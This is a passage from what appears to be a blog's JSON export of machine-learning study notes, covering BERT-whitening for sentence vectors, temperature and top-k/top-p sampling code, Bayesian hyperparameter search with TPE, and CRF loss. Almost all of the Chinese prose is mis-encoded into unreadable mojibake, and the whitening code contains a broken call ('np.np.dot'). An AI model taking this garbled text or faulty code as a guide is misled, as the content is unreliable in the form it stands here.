representationsæ›´ä¸contextç›¸å…³ï¼Œä¸åŒcontextä¸‹çš„æ•°å€¼è¡¨ç¤ºç›¸å·®æ›´å¤§ã€‚åŒæ—¶ä¸åŒè¯ä¸contextç›¸å…³çš„ç›¸å…³ç¨‹åº¦ä¸åŒï¼Œæ¯”å¦‚ï¼Œstop wordsä¸contextçš„ç›¸å…³æ€§ä¼šå¾ˆå¤§ï¼› ä¸åŒæ¨¡å‹çš„æ¯ä¸€å±‚è¾“å‡ºé—´çš„ç›¸å…³æ€§ä¹Ÿä¸åŒï¼šEMLoçš„ä½å±‚å’Œé«˜å±‚çš„è¾“å‡ºæ›´ç›¸ä¼¼ä¸€äº›ï¼›BERTçš„ä½å±‚å’Œé«˜å±‚çš„è¾“å‡ºå˜åŒ–è¾ƒå¤§ï¼ŒåŒæ—¶å¥å­å†…è¯çš„è¡¨ç¤ºä¼šæ›´æ¥è¿‘ï¼Œå’Œå…¶ä»–å¥å­ä¸­è¯çš„è¡¨ç¤ºç›¸å¯¹æ›´å·®å¼‚åŒ–ä¸€äº›ï¼›GPT-2çš„è¾“å‡ºä¸åŒï¼ŒæŸä¸€ä¸ªè¾“å‡ºä¸å½“å‰å¥å­å†…çš„è¯çš„ç›¸ä¼¼æ€§å’Œå½“å‰å¥å­ä¹‹å¤–çš„è¯çš„ç›¸ä¼¼æ€§ï¼Œæ˜¯æ¥è¿‘çš„ã€‚ BERT-flowæ–‡ä¸­ç»™å‡ºçš„ç†ç”±ï¼š è¯é¢‘å·®å¼‚ä½¿å¾—ä½é¢‘è¯å’Œé«˜é¢‘è¯çš„å­¦ä¹ ç¨‹åº¦ä¸åŒï¼Œå…¬å¼7å¯ä»¥ä½œä¸ºä¸€ä¸ªä¾æ®ï¼› ä½é¢‘è¯çš„è¡¨ç¤ºæ›´åç¨€ç–ï¼Œè€Œé«˜é¢‘è¯çš„è¡¨ç¤ºæ›´ç¨ å¯†ã€‚ 3. å¯é€†å˜æ¢åˆ°standard Gaussian latent space å€Ÿé‰´Glowæ¨¡å‹çš„å®ç°æ–¹å¼ï¼Œå®ç°flow-based generative modelã€‚å°†BERTå‚æ•°å›ºå®šï¼Œåªå­¦ä¹ å¯é€†å˜æ¢çš„ç½‘ç»œå‚æ•°ã€‚åªä½¿ç”¨äº†add coupling layerï¼Œå°†1x1å·ç§¯å˜æˆç›´æ¥permutationã€‚ æ±‚zä¸ºï¼š ä»¥ä¸Šå°†Dç»´å‘é‡ï¼Œåˆ†ä¸ºä¸¤éƒ¨åˆ†è®¡ç®—æ›´æ–°ã€‚åŒæ—¶zçš„å…ˆéªŒä¸ºæ ‡å‡†æ­£æ€åˆ†å¸ƒã€‚é‚£ä¹ˆ \\(f^{-1}\\)å’Œ\\(J_{f^{-1}}\\)éƒ½æ˜¯å¯ä»¥è®¡ç®—çš„ï¼Œç›®æ ‡å‡½æ•°å°±å¯ä»¥è¡¨ç¤ºã€‚ 4. Lexical Similarityåœ¨ä¸åŒæ¨¡å‹ä¸­çš„è§„å¾‹å®éªŒ è®ºæ–‡é€šè¿‡ä¸€ç»„ç®€å•çš„å¯¹æ¯”å®éªŒï¼Œå¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š BERT-Induced Similarityçš„ä¸Lexical Similarityå­˜åœ¨ç€è¿‡åº¦çš„ç›¸å…³æ€§ã€‚ Flow-Induced Similarity ä¸Lexical Similarityçš„ç›¸å…³æ€§è¾ƒä½ã€‚ æ–¹æ³•æ˜¯é€šè¿‡Similarityä¸Edit distanceçš„å¯¹åº”å…³ç³»ï¼Œå®éªŒç»“æœå¦‚å›¾ï¼š Confusion: æ­£äº¤æ ‡å‡†åŒ–ï¼Ÿæ ‡å‡†åŒ–åæ–¹å·®çŸ©é˜µï¼Ÿ æ±‚ä¸€ä¸ªçº¿æ€§å˜æ¢\\(W\\)ä½¿å¾—BERTè¾“å‡ºçš„å‘é‡çŸ©é˜µæˆä¸€ä¸ªæ ‡å‡†åŒ–çš„çŸ©é˜µã€‚ç›´æ¥è¾¾åˆ°æ­£äº¤åŒ–çš„ç›®çš„ï¼Œæ˜¯å¦ä¹Ÿæ˜¯å¯è¡Œï¼Ÿ é¦–å…ˆæ±‚åŸå§‹åæ–¹å·®çŸ©é˜µï¼š \\[ \\mu=\\frac{1}{N}\\sum_{k=1}^Nxi \\] é‚£ä¹ˆ \\[ \\Sigma=\\frac{1}{N}\\sum_{k=1}^N(x_i-\\mu)^T(x_i-\\mu) \\] å˜æ¢\\(W\\)æ»¡è¶³ï¼š \\[ W^T\\Sigma W=I \\] å…¶ä¸­\\(\\Sigma\\)ä¸ºä¸€ä¸ªæ­£äº¤å¯¹ç§°çŸ©é˜µã€‚å¯¹å…¶SVDï¼Œæœ‰å¦‚ä¸‹å…³ç³»ï¼š \\[ \\Sigma=U\\Lambda U^T=(W^{-1})^TW^{-1} \\] å¾—åˆ°å˜æ¢\\(W\\)ä¸ºï¼š \\[ W=U\\sqrt{\\Lambda^{-1}} \\] ä½œè€…å®éªŒçš„ç»“æœæ˜¾ç¤ºï¼Œè¯¥æ–¹æ³•ç®€æ´ï¼Œä¸”æ•ˆæœä¸flowæ¨¡å‹ç›¸å·®æ— å‡ ã€‚ ä½œè€…ç§°è¯¥æ–¹æ³•ä¸ºBERT-whiteningã€‚ æ ¸å¿ƒä»£ç ï¼š 1234567def compute_w_bias(vecs, n_components): vecs = np.concatenate(vecs, axis=0) mu = vecs.mean(axis=0, keepdims=True) cov = np.cov(vecs.T) u, s, vh = np.linalg.svd(cov) W = np.np.dot(u, np.diag(1/np.sqrt(s))) return W[:, :n_components], -mu æ ‡å‡†åŒ– 1234def transform_and_normalize(vecs, kernel=None, bias=None): if not (kernel is None or bias is None): vecs = (vecs + bias).dot(kernel) return vecs / (vecs**2).sum(axis=1, keepdims=True)**0.5 å®ç°ç»†èŠ‚ å¤§è¯­æ–™è®¡ç®—å†…å­˜é—®é¢˜ï¼Ÿ å¥å­å‘é‡å‡å€¼é€’å½’è®¡ç®— \\[ \\mu_{n+1}=\\frac{n}{n+1}\\mu_n+\\frac{1}{n+1}x_{n+1} \\] åæ–¹å·®é€’å½’è®¡ç®— \\[ \\Sigma_{n+1}=\\frac{n}{n+1}\\Sigma_n+\\frac{1}{n+1}(x_{n+1}-\\mu)^T(x_{n+1}-\\mu) \\] BERTæ¨¡å‹åœ¨ä»»åŠ¡æ•°æ®ä¸Šï¼Œå…ˆå¾®è°ƒ è®ºæ–‡ä¸­å…ˆåœ¨ä»»åŠ¡æ•°æ®ä¸Šå¾®è°ƒï¼Œæ¯”å¦‚å…ˆè¿›è¡Œæƒ…æ„Ÿåˆ†ç±»ä»»åŠ¡ï¼Œå†ç”¨æ¥è®¡ç®—å¥å­å‘é‡ã€‚ flowåšä¸åˆ°çš„ç®€å•çš„å¥å­å‘é‡é™ç»´ SVDä¸­ç›´æ¥å–\\(W\\)å‰nä¸ªç»´åº¦ï¼Œå³PCAï¼Œå¾—åˆ°é™ç»´çš„ç»“æœã€‚è¯¥ç»“æœå°†æ›´å…·ä»»åŠ¡è¯­å¢ƒç‰¹å¾çš„ç»´åº¦æå–å‡ºæ¥ã€‚ä¸ä»…æå‡äº†å¥å­å‘é‡é—´ç›¸ä¼¼åº¦çš„é€Ÿåº¦ï¼Œè¿˜å¯èƒ½æå‡é¢„æµ‹çš„æ•ˆæœã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"sentence embedding","slug":"sentence-embedding","permalink":"https://racleray.github.io/tags/sentence-embedding/"},{"name":"BERT","slug":"BERT","permalink":"https://racleray.github.io/tags/BERT/"},{"name":"nlp","slug":"nlp","permalink":"https://racleray.github.io/tags/nlp/"}]},{"title":"è¯­è¨€æ¨¡å‹Samplingæ–¹æ³•","slug":"è¯­è¨€æ¨¡å‹Samplingæ–¹æ³•","date":"2021-01-20T06:59:46.000Z","updated":"2023-08-07T11:54:31.051Z","comments":true,"path":"posts/e798f591.html","link":"","permalink":"https://racleray.github.io/posts/e798f591.html","excerpt":"","text":"åœ¨text generationæ¨¡å‹é¢„æµ‹æ—¶ï¼Œå¦‚æœæˆ‘ä»¬æ€»æ˜¯æŠ½å–æœ€æœ‰å¯èƒ½çš„å•è¯ï¼Œæ ‡å‡†è¯­è¨€æ¨¡å‹è®­ç»ƒç›®æ ‡ä¼šå®¹æ˜“é™·å…¥â€œI donâ€™t know. I donâ€™t know. I donâ€™t know.â€ è¿™ç§å¾ªç¯ä¸­ã€‚æ‰€ä»¥æœ‰äº†sample based generationæ–¹æ³•ã€‚ä½†æ˜¯ï¼Œå®ƒæœ‰ä¸€ä¸ªæ½œåœ¨é—®é¢˜ï¼š å‡å¦‚ä¾ç…§logit softmaxç”Ÿæˆçš„åˆ†å¸ƒè¿›è¡Œsampleï¼Œå‡è®¾æœ‰60%çš„è¯çš„æ¦‚ç‡æä½ä»¥è‡³äºåŸºæœ¬ä¸ä¼šè¢«é€‰æ‹©ï¼Œä½†æ˜¯è¿™60%çš„è¯çš„æ€»çš„CDFå äº†30%ï¼Œè¿™æ„å‘³ç€æ¨¡å‹é¢„æµ‹æ–¹å‘å¯èƒ½æœ‰30%çš„æ¦‚ç‡åç¦»äº†â€œæ­£ç¡®â€çš„æ–¹å‘ã€‚ è€Œå¦‚æœæ˜¯åœ¨é¢„æµ‹å‰æœŸå‘ç”Ÿåç¦»ï¼Œé‚£ä¹ˆç”±äºé”™è¯¯å‘åé¢„æµ‹çš„ç´¯ç§¯ï¼Œç›´æ¥å¯¼è‡´äº†é¢„æµ‹çš„æ•ˆæœå˜å·®ã€‚ å·²æœ‰è®ºæ–‡ç ”ç©¶å‘ç°ï¼Œç»å¸¸è¢«ä½¿ç”¨çš„Beam searchæ–¹æ³•ï¼Œå…¶ç”Ÿæˆæ•ˆæœå’Œäººç±»çš„è¡¨è¾¾æœ‰ç€ä¸€å®šçš„gapã€‚ [^]: Humans often choose words that surprise language models (Holtzman et al 2019) https://arxiv.org/abs/1904.09751 è§£å†³æ–¹æ³•ï¼štemperature samplingå’Œtop k sampling. Temperature sampling å€Ÿé‰´çƒ­åŠ›å­¦ä¸­ç°è±¡ï¼Œæ¸©åº¦è¶Šé«˜ï¼Œåˆ™ä½energyçš„çŠ¶æ€å‡ºç°çš„æ¦‚ç‡ä¼šå¢åŠ ã€‚ ä»¥logitsä½œä¸ºâ€œenergyâ€ï¼Œåœ¨è¿›è¡Œsoftmaxä¹‹å‰ï¼Œé™¤ä»¥temperatureã€‚ 1234567891011&gt;&gt;&gt; import torch&gt;&gt;&gt; import torch.nn.functional as F&gt;&gt;&gt; a = torch.tensor([1,2,3,4.])&gt;&gt;&gt; F.softmax(a, dim=0)tensor([0.0321, 0.0871, 0.2369, 0.6439])&gt;&gt;&gt; F.softmax(a/.5, dim=0)tensor([0.0021, 0.0158, 0.1171, 0.8650])&gt;&gt;&gt; F.softmax(a/1.5, dim=0)tensor([0.0708, 0.1378, 0.2685, 0.5229])&gt;&gt;&gt; F.softmax(a/1e-6, dim=0)tensor([0., 0., 0., 1.]) NOTEï¼štemperatureè¶Šå¤§ï¼Œåˆ†å¸ƒè¶Šè¶‹å‘å‡åŒ€ Top k sampling Top k samplingæ˜¯æŒ‡æ ¹æ®æ¦‚ç‡è¿›è¡Œæ’åºå°†ç¬¬kä¸ªtokenä»¥ä¸‹çš„æ¦‚ç‡éƒ½å½’é›¶ã€‚ ä½†æ˜¯å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šæŸäº›æ—¶å€™ï¼Œåˆ†å¸ƒè¾ƒå‡åŒ€ï¼Œå¯ä»¥é€‰æ‹©çš„tokenå¤§äºkï¼›æŸäº›æ—¶å€™ï¼Œåˆ†å¸ƒè¾ƒé›†ä¸­ï¼Œå¯ä»¥é€‰æ‹©çš„tokenå°äºkã€‚ ç›´æ¥å¯¼è‡´äº†é¢„æµ‹é”™è¯¯çš„æ¦‚ç‡å¢å¤§ã€‚ Top p samplingï¼ˆnucleus samplingï¼‰ 1ï¼ŒæŒ‰æ¦‚ç‡sorté¢„æµ‹åˆ†å¸ƒï¼› 2ï¼Œè®¡ç®—CDFï¼› 3ï¼Œå°†CDFå¤§äºæŸä¸ªè®¾å®špå€¼ä¹‹åçš„logitå€¼ï¼Œè®¾ä¸ºä¸€ä¸ªå¾ˆå¤§çš„è´Ÿå€¼ï¼› 4ï¼Œsoftmaxï¼Œä¹‹åè¿›è¡Œé‡‡æ ·ã€‚ è¿™æ ·å°±èƒ½åŠ¨æ€çš„æ”¹å˜å¯é€‰æ‹©çš„tokenæ•°é‡ï¼Œä¸”é”™è¯¯æ¦‚ç‡ç›¸å¯¹é™ä½ã€‚ 1234567891011121314151617181920212223242526272829303132import torchimport torch.nn.functional as Fimport numpy as npdef top_k_top_p_filtering(logits, top_k=0, top_p=0.0, filter_value=-float('Inf')): \"\"\" Filter a distribution of logits using top-k and/or nucleus (top-p) filtering Args: logits: logits distribution shape (..., vocabulary size) top_k &gt;0: keep only top k tokens with highest probability (top-k filtering). top_p &gt;0.0: keep the top tokens with cumulative probability &gt;= top_p (nucleus filtering). \"\"\" top_k = min(top_k, logits.size(-1)) # Safety check if top_k &gt; 0: # Remove all tokens with a probability less than the last token of the top-k indices_to_remove = logits &lt; torch.topk(logits, top_k)[0][..., -1, None] logits[indices_to_remove] = filter_value if top_p &gt; 0.0: sorted_logits, sorted_indices = torch.sort(logits, descending=True) cumulative_probs = torch.cumsum(F.softmax(sorted_logits, dim=-1), dim=-1) # Remove tokens with cumulative probability above the threshold sorted_indices_to_remove = cumulative_probs &gt;= top_p # Shift the indices to the right to keep also the first token above the threshold sorted_indices_to_remove[..., 1:] = sorted_indices_to_remove[..., :-1].clone() sorted_indices_to_remove[..., 0] = 0 indices_to_remove = torch.zeros_like(logits, dtype=torch.uint8).scatter_( dim=-1, index=sorted_indices, src=sorted_indices_to_remove ) logits[indices_to_remove] = filter_value return logits End è™½ç„¶æœ‰è¿™äº›æ–¹æ³•æ¥æ”¹è¿›æ¨¡å‹ç”Ÿæˆçš„æ•ˆæœï¼Œä½†æ˜¯è¿™äº›ä»…ä»…æ˜¯æ¨¡å‹çš„â€œè¡¥ä¸â€ã€‚å¦‚ä½•æé«˜æ¨¡å‹æœ¬èº«çš„æ€§èƒ½ï¼Œå¦‚ä½•è®©æ¨¡å‹èƒ½å¤Ÿç›´æ¥ç”Ÿæˆå¤šæ ·æ€§çš„ã€æ›´â€œäººç±»â€çš„è¯­å¥ï¼Ÿemmm...","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"language model","slug":"language-model","permalink":"https://racleray.github.io/tags/language-model/"},{"name":"sampling","slug":"sampling","permalink":"https://racleray.github.io/tags/sampling/"}]},{"title":"è´å¶æ–¯è¶…å‚æ•°æœç´¢","slug":"è´å¶æ–¯è¶…å‚æ•°æœç´¢","date":"2020-11-30T13:48:56.000Z","updated":"2023-08-07T11:54:31.051Z","comments":true,"path":"posts/d941eeb.html","link":"","permalink":"https://racleray.github.io/posts/d941eeb.html","excerpt":"è´å¶æ–¯æ–¹æ³•è·Ÿè¸ªè¿‡å»çš„è¯„ä¼°ç»“æœï¼Œå»ºç«‹å½¢æˆä¸€ä¸ªæ¦‚ç‡æ¨¡å‹ï¼Œå°†è¶…å‚æ•°æ˜ å°„åˆ°ç›®æ ‡å‡½æ•°ä¸Šå¾—åˆ†çš„æ¦‚ç‡ã€‚è¿™ä¸ªæ¨¡å‹è¢«ç§°ä¸ºç›®æ ‡å‡½æ•°çš„ä»£ç†ã€‚è¯„ä¼°ç›®æ ‡å‡½æ•°åä¸æ–­åœ°æ›´æ–°æ¦‚ç‡æ¨¡å‹ã€‚","text":"paper by Bergstra et al ä¸€å¥è¯æ¦‚æ‹¬Bayesian hyperparameter optimizationï¼š build a probability model of the objective function and use it to select the most promising hyperparameters to evaluate in the true objective function. å¸¸ç”¨ç®—æ³•ï¼šSequential Model-Based Optimization (SMBO) with the Tree Parzen Estimator (TPE) åŸç†ç®€è¿° è´å¶æ–¯æ–¹æ³•ç›¸è¾ƒäºéšæœºæœç´¢å’Œç½‘æ ¼æœç´¢ï¼Œæ˜¯æ›´é«˜æ•ˆçš„ã€‚éšæœºæœç´¢å’Œç½‘æ ¼æœç´¢æ ¹æœ¬ä¸å…³æ³¨è¿‡å»çš„ç»“æœï¼Œè€Œæ˜¯ç»§ç»­åœ¨æ•´ä¸ªèŒƒå›´å†…æœç´¢ï¼Œå³ä½¿æœ€ä¼˜ç­”æ¡ˆ(å¯èƒ½)å¾ˆæ˜æ˜¾åœ¨ä¸€ä¸ªå°åŒºåŸŸå†…ã€‚ ä¸éšæœºæˆ–ç½‘æ ¼æœç´¢ç›¸åï¼Œè´å¶æ–¯æ–¹æ³•è·Ÿè¸ªè¿‡å»çš„è¯„ä¼°ç»“æœï¼Œå»ºç«‹å½¢æˆä¸€ä¸ªæ¦‚ç‡æ¨¡å‹ï¼Œå°†è¶…å‚æ•°æ˜ å°„åˆ°ç›®æ ‡å‡½æ•°ä¸Šå¾—åˆ†çš„æ¦‚ç‡ã€‚è¿™ä¸ªæ¨¡å‹è¢«ç§°ä¸ºç›®æ ‡å‡½æ•°çš„ä»£ç†ã€‚ä»£ç†æ¨¡å‹ï¼ˆä¹Ÿå«åšå“åº”é¢ï¼‰åˆç›¸å¯¹æ›´å®¹æ˜“ä¼˜åŒ–ã€‚ è¿è¡Œè¿‡ç¨‹ä¸ºï¼š å»ºç«‹ç›®æ ‡å‡½æ•°çš„æ›¿ä»£æ¦‚ç‡æ¨¡å‹ï¼Œä»£ç†æ¨¡å‹ æŸ¥æ‰¾åœ¨ä»£ç†ä¸Šæ€§èƒ½æœ€ä½³çš„è¶…å‚æ•° å°†è¿™äº›è¶…å‚æ•°åº”ç”¨äºçœŸæ­£çš„ç›®æ ‡å‡½æ•° æ›´æ–°åŒ…å«æ–°ç»“æœçš„ä»£ç†æ¨¡å‹ é‡å¤æ­¥éª¤2-4ï¼Œç›´åˆ°è¾¾åˆ°æœ€å¤§è¿­ä»£æ¬¡æ•°æˆ–æ—¶é—´ä¸ºæ­¢ è´å¶æ–¯æ¨ç†çš„ç›®çš„æ˜¯é€šè¿‡åœ¨æ¯æ¬¡è¯„ä¼°ç›®æ ‡å‡½æ•°åä¸æ–­åœ°æ›´æ–°æ¦‚ç‡æ¨¡å‹ï¼Œä»è€Œè·å¾—æ›´å¤šçš„æ•°æ®ï¼Œå‡å°‘é”™è¯¯ã€‚ è´å¶æ–¯ä¼˜åŒ–æ–¹æ³•æ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸ºå®ƒä»¬æœ‰æ ¹æ®çš„é€‰æ‹©äº†ä¸‹ä¸€ä¸ªè¶…å‚æ•°ã€‚ åŸºæœ¬æ€æƒ³æ˜¯ï¼šèŠ±æ›´å¤šçš„æ—¶é—´é€‰æ‹©ä¸‹ä¸€ä¸ªè¶…å‚æ•°ï¼Œä»¥å‡å°‘å¯¹ç›®æ ‡å‡½æ•°çš„è°ƒç”¨ã€‚ å®é™…ä¸Šï¼Œä¸åœ¨ç›®æ ‡å‡½æ•°ä¸­èŠ±è´¹çš„æ—¶é—´ç›¸æ¯”ï¼Œé€‰æ‹©ä¸‹ä¸€ä¸ªè¶…å‚æ•°æ‰€èŠ±è´¹çš„æ—¶é—´æ˜¯å¾ˆå°‘çš„ã€‚ é€šè¿‡è¯„ä¼°ä»è¿‡å»çš„ç»“æœçœ‹ä¼¼æ›´æœ‰å¸Œæœ›çš„è¶…å‚æ•°ï¼Œè´å¶æ–¯æ–¹æ³•å¯ä»¥åœ¨æ›´å°‘çš„è¿­ä»£ä¸­æ‰¾åˆ°æ¯”éšæœºæœç´¢æ›´å¥½çš„æ¨¡å‹è®¾ç½®ã€‚ ä¸€ä¸ªç®€å•çš„è§£é‡Šå¦‚ä¸‹å›¾ï¼š ä»£ç†æ¨¡å‹æ˜¯ç²—é»‘çº¿å’Œå™¨ä¸Šçº¿ç•Œç»†é»‘çº¿ç»„æˆçš„åŒºåŸŸã€‚çº¢è‰²è™šçº¿è¡¨ç¤ºçœŸå®çš„ç›®æ ‡å‡½æ•°ã€‚ ç»è¿‡è´å¶æ–¯ä¼˜åŒ–å‡ è½®è¿­ä»£ä¹‹åï¼Œå¾—åˆ°ï¼š ä»£ç†æ¨¡å‹é€æ¸è¶‹è¿‘ç›®æ ‡å‡½æ•°ã€‚ Sequential Model-Based Optimization Sequentialæ˜¯æŒ‡ä¸€ä¸ªæ¥ä¸€ä¸ªåœ°è¿›è¡Œè¯•éªŒï¼Œæ¯æ¬¡éƒ½é€šè¿‡åº”ç”¨è´å¶æ–¯æ¨ç†æ›´æ–°æ¦‚ç‡æ¨¡å‹(ä»£ç†)æ¥è·å–æ›´å¥½çš„è¶…å‚æ•°ã€‚ç»„æˆéƒ¨åˆ†æœ‰ï¼š è¦æœç´¢çš„è¶…å‚æ•°åŸŸ ä»¥è¶…å‚æ•°ä¸ºè¾“å…¥å¹¶è¾“å‡ºå¾—åˆ†çš„ç›®æ ‡å‡½æ•° ç›®æ ‡å‡½æ•°çš„ä»£ç†æ¨¡å‹ ä¸€ä¸ªcriteriaï¼ˆSelection Functionï¼‰ï¼Œç§°ä¸ºé€‰æ‹©å‡½æ•°ï¼Œç”¨äºè¯„ä¼°ä»æ›¿ä»£æ¨¡å‹ä¸­ä¸‹ä¸€æ­¥è¦é€‰æ‹©çš„è¶…å‚æ•° è¯¥ç®—æ³•ç”±ï¼ˆå¾—åˆ†ï¼Œè¶…å‚æ•°ï¼‰å¯¹ç»„æˆçš„å†å²è®°å½•ï¼Œè¯¥å†å²å¯¹ç”±ç®—æ³•ç”¨äºæ›´æ–°ä»£ç†æ¨¡å‹ ä»£ç†æ¨¡å‹çš„é€‰æ‹©æœ‰ï¼šGaussian Processes, Random Forest Regressions, , Tree Parzen Estimators (TPE). criteriaå¸¸ç”¨Expected Improvement ä»£ç†æ¨¡å‹ï¼Œä¹Ÿç§°ä¸ºå“åº”é¢ï¼Œæ˜¯åˆ©ç”¨ä»¥å‰çš„è¯„ä¼°ç»“æœå»ºç«‹çš„ç›®æ ‡å‡½æ•°çš„æ¦‚ç‡è¡¨ç¤ºã€‚ Expected Improvementé€‰æ‹©å‡½æ•° y* -- ç›®æ ‡å‡½æ•°çš„é˜ˆå€¼ x -- è¶…å‚æ•°ç»„åˆçš„é›†åˆ y -- è¾“å…¥xè¶…å‚æ•°å¾—åˆ°çš„ç›®æ ‡å‡½æ•°çœŸå®è¿”å›å€¼ p(y | x) -- ä»£ç†æ¨¡å‹è¾“å‡ºçš„æ¦‚ç‡ å…¶ç›®çš„æ˜¯æœ€å¤§åŒ–å…³äºxçš„Expected Improvementã€‚ å¦‚æœp (y | x)åœ¨y &lt; y*å¤„ï¼Œéƒ½ä¸ºé›¶ï¼Œåˆ™è¶…å‚æ•°xä¸ä¼šäº§ç”Ÿä»»ä½•æ”¹è¿›ã€‚ å¦‚æœç§¯åˆ†ä¸ºæ­£ï¼Œåˆ™æ„å‘³ç€è¶…å‚æ•°xé¢„æœŸä¼šäº§ç”Ÿæ¯”é˜ˆå€¼æ›´å¥½çš„ç»“æœã€‚ Tree-structured Parzen Estimator (TPE) ä½¿ç”¨è´å¶æ–¯å…¬å¼ï¼Œè®¡ç®—p(y | x) p (x | y)ï¼Œæ˜¯ç»™å®šç›®æ ‡å‡½æ•°å¾—åˆ†çš„è¶…å‚æ•°çš„æ¦‚ç‡ã€‚ å¯¹è¶…å‚æ•°åšäº†ä¸¤ç§ä¸åŒçš„åˆ†å¸ƒ:ä¸€ç§æ˜¯ç›®æ ‡å‡½æ•°çš„å€¼å°äºé˜ˆå€¼ï¼Œl(x)ï¼Œå¦ä¸€ç§æ˜¯ç›®æ ‡å‡½æ•°çš„å€¼å¤§äºé˜ˆå€¼ï¼Œg(x)ã€‚ ç»“åˆSMBOä»¥åŠä¸€ç‚¹ç›´è§‚çš„å°è±¡ï¼Œæˆ‘ä»¬å¸Œæœ›ä»l(x)è€Œä¸æ˜¯ä»g(x)ä¸­å¾—å‡ºxçš„å€¼ï¼Œå› ä¸ºè¿™ç§åˆ†å¸ƒåªåŸºäºäº§ç”Ÿä½äºé˜ˆå€¼å¾—åˆ†çš„xçš„å€¼ã€‚ æœ€ç»ˆå¾—åˆ°çš„Expected Improvementï¼š å¯ä»¥å‘ç°Expected Improvementå’Œl(x) / g(x)çš„æ¯”å€¼æˆåæ¯”ã€‚æé«˜EIï¼Œæ­£æ˜¯éœ€è¦ä»l(x)ä¸­å¤šå¾—åˆ°p (x | y)çš„å€¼ã€‚ è¯¥ç®—æ³•åˆ©ç”¨å†å²å¾—åˆ†å»ºç«‹l(x)å’Œg(x)ï¼Œæå‡ºç›®æ ‡å‡½æ•°çš„æ¦‚ç‡æ¨¡å‹ï¼Œä»£ç†æ¨¡å‹éšç€æ¯æ¬¡è¿­ä»£è€Œæ”¹è¿›ã€‚ å·¥å…· Spearmintï¼Œ MOE ï¼š Gaussian Process (surrogate) Hyperopt ï¼šTree-structured Parzen Estimator Notebookç¤ºä¾‹ï¼Œç¤ºä¾‹ï¼Œç¤ºä¾‹ SMAC ï¼šRandom Forest regression. éƒ½ä½¿ç”¨Expected Improvementé€‰æ‹©å‡½æ•°ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"ML","slug":"Notes/ML","permalink":"https://racleray.github.io/categories/Notes/ML/"}],"tags":[{"name":"machine learning","slug":"machine-learning","permalink":"https://racleray.github.io/tags/machine-learning/"}]},{"title":"CRF--SimpleNote","slug":"CRF-SimpleNote","date":"2020-11-18T08:29:17.000Z","updated":"2023-09-23T13:45:02.173Z","comments":true,"path":"posts/798499bc.html","link":"","permalink":"https://racleray.github.io/posts/798499bc.html","excerpt":"NERæ ‡æ³¨è¾“å‡ºä¸ä»…ä»…æ˜¯ç®€å•çš„åˆ†ç±»ï¼Œè€Œæ˜¯å…·æœ‰ä¸€å®šå…³è”è§„å¾‹çš„æ ‡æ³¨è¾“å‡ºã€‚CRFæ­£æ˜¯è¾“å‡ºè¿™ç§ç»“æ„åŒ–ç»“æœçš„ä¸€ç§ç®—æ³•ã€‚ç»“åˆHMMï¼ˆçŠ¶æ€è½¬ç§»å’ŒçŠ¶æ€é‡Šæ”¾ï¼‰å’Œæœ€å¤§ç†µæ¨¡å‹ï¼ˆlog linear modelå»ºæ¨¡ç‰¹å¾å‡½æ•°ï¼Œå¯»æ‰¾æœ€ä¼˜çš„æ¡ä»¶æ¦‚ç‡ï¼‰ï¼Œåœ¨MEMMçš„åŸºç¡€ä¸Šï¼Œå»ºç«‹éšå˜é‡Xçš„æ¦‚ç‡æ— å‘å›¾è§£å†³äº†MEMMçš„å±€éƒ¨å½’ä¸€åŒ–é—®é¢˜ã€‚","text":"Motivation NERæ ‡æ³¨è¾“å‡ºä¸ä»…ä»…æ˜¯ç®€å•çš„åˆ†ç±»ï¼Œè€Œæ˜¯å…·æœ‰ä¸€å®šå…³è”è§„å¾‹çš„æ ‡æ³¨è¾“å‡ºã€‚CRFæ­£æ˜¯è¾“å‡ºè¿™ç§ç»“æ„åŒ–ç»“æœçš„ä¸€ç§ç®—æ³•ã€‚ ç»“åˆHMMï¼ˆçŠ¶æ€è½¬ç§»å’ŒçŠ¶æ€é‡Šæ”¾ï¼‰å’Œæœ€å¤§ç†µæ¨¡å‹ï¼ˆlog linear modelå»ºæ¨¡ç‰¹å¾å‡½æ•°ï¼Œå¯»æ‰¾æœ€ä¼˜çš„æ¡ä»¶æ¦‚ç‡ï¼‰ï¼Œåœ¨MEMMçš„åŸºç¡€ä¸Šï¼Œå»ºç«‹éšå˜é‡Xçš„æ¦‚ç‡æ— å‘å›¾è§£å†³äº†MEMMçš„å±€éƒ¨å½’ä¸€åŒ–é—®é¢˜ã€‚ CRF loss in Deep Learning lossçš„ä¼˜åŒ–ç›®æ ‡æ˜¯ä½¿å¾—æ¨¡å‹è¾“å‡ºçš„æœ€ä¼˜è·¯å¾„å’Œgroud truthè·¯å¾„å°½é‡æ¥è¿‘ã€‚å³ï¼Œæœ€å¤§åŒ–æœ€ä¼˜è·¯å¾„æ¦‚ç‡ã€‚ æœ€ä¼˜è·¯å¾„æ¦‚ç‡å®šä¹‰ä¸ºï¼Œ åœ¨CRF lossä¸­ï¼ŒPié€šè¿‡ä¸¤ç»„å˜é‡æ±‚å¾—ï¼ŒEmission Scoreå’ŒTransition Scoreï¼ˆä¼ ç»ŸCRFä¸­çš„ç‰¹å¾å‡½æ•°ï¼‰ã€‚ Emission Scoreï¼šå¯¹åº”ç¥ç»ç½‘ç»œè¾“å‡ºçš„hidden stateã€‚å¯è§†ä¸ºæ¯ä¸€æ­¥è¾“å‡ºæ ‡ç­¾çš„åˆ†ç±»æ¦‚ç‡åˆ†å¸ƒé¢„æµ‹ï¼Œæ¯ä¸€æ­¥è¾“å‡ºç»´åº¦ä¸º[#tags, 1]ã€‚ Transition Scoreï¼šå¯¹åº”CRFå±‚ä¸­å®šä¹‰çš„çŠ¶æ€è½¬ç§»æƒé‡çŸ©é˜µã€‚ä¿å­˜åœ¨CRF layerä¸­ï¼Œ[#tags, #tags] ä¸¤è€…åœ¨æ·±åº¦æ¨¡å‹ä¸­éƒ½æ˜¯ä½œä¸ºæƒé‡å˜é‡æ¥ä¼˜åŒ–å­¦ä¹ çš„ã€‚ 